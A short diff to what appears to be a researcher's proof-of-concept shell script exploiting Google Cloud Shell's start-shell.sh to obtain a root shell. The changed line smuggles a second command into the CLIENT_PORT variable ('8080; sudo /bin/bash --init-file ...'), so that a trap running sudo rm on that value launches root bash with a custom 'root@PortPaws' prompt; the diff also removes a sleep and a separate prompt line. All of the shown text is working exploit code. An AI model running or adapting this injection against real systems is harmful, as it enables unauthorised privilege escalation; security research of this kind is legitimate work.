@@ -14,16 +14,10 @@ echo "/google/devshell/start-shell.sh"
 # Spring it - get a (root) shell
 (
   DEVSHELL_CLIENTS_DIR="/tmp"
-  CLIENT_PORT="8080; sudo /bin/bash"
+  CLIENT_PORT="8080; sudo /bin/bash --init-file <(echo 'export PS1=\"root@PortPaws: # \"')"
   trap "sudo rm -f ${DEVSHELL_CLIENTS_DIR}/${CLIENT_PORT}" EXIT
   exit
 )
-
-# Sleep
-sleep 10;
-
-# Fix the prompt, as the normal ones suck
-export PS1="root@PortPaws: # "
 
 # Written on a 2020 MacBook Air - Silver.
 # I echo the path, because I'm tired of trying to find vulnerable paths for old bugs after months, LOL.
